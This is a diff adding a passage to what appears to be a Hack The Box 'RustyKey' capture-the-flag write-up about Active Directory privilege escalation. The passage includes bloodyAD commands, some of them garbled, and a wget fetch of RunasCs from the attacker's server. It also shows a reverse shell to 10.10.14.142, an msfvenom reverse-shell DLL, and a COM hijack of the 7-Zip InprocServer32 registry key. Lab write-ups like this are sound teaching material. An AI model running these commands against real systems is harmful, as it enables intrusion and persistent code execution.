@@ -132,11 +132,50 @@ We find that the Support group has full control; the user morgan is not a meber 
 
 <img width="919" height="253" alt="image" src="https://github.com/user-attachments/assets/96a30e2c-4b58-4e33-ad55-2970d945f932" />
 
-Now we need to take control of EE.REED.
-``
-``
-``
+Now we need to take control of EE.REED. So we have to do the sames as with morgan:
 
+` bloodyAD -d rustykey.htb --host dc.rustykey.htb -u '-COMPUTER3$'`
+
+` bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'noIBombardamentiOggi!'`
+
+`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u ed Objects' 'Support'`
+
+<img width="1124" height="224" alt="image" src="https://github.com/user-attachments/assets/eabfd0e7-f9bf-477f-beb5-dba0f05e2816" />
+
+Later, I tried requesting a TGT for REED and got it, but I couldn't figure out why I still couldn't connect via WinRM. I realized that this user had some restrictions.I used RunasCs to perform pivoting on REED. Since the standard WinRM shell does not support interactive prompts for user switching, RunasCs allowed me to provide ee.reed’s credentials via the command line and establish a new reverse shell within its security context.
+
+
+`python3 -m http.server`
+
+`wget http://10.10.14.142:8000/runascs.exe -o runascs.exe`
+
+`rlwrap nc -lvnp 9001`
+
+`.\runascs.exe ee.reed 'ComeSonoIBombardamentiOggi!' powershell -r 10.10.14.142:9001`
+
+<img width="533" height="146" alt="image" src="https://github.com/user-attachments/assets/2e1580c2-80a8-4e97-8e00-551d7b9ac7bc" />
+
+Now we need to create our malicious DLL
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.142 LPORT=9001 -f dll -o rev.dll`
+
+`python3 -m http.server `
+
+`wget http://10.10.14.142:8000/rev.dll -o rev.dll`
+
+## COM Hijacking 
+Now for the most important part: edit the path stored in the InprocServer32 registry key (under the 7-Zip CLSID), changing the default value from the original DLL to C:\ProgramData\rev.dll.
+`Set-ItemProperty -Path "HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "" -Value "C:\ProgramData\rev.dll"`
+
+By replacing the value of the InprocServer32 subkey (which normally points to the program’s legitimate DLL) with the path to an arbitrary DLL of mine located in C:\ProgramData, I ensured that the system loads and executes my malicious code every time the COM object is called by a process with higher privileges (such as Windows Explorer or a scheduled administrator task).
+
+<img width="539" height="220" alt="image" src="https://github.com/user-attachments/assets/571ca21a-5986-4138-91a5-35f28f30a7ab" />
+
+We've gained a Turner user shell; let's see what we can do with it using Bloodhound
+
+``
+``
+``
 
 
 
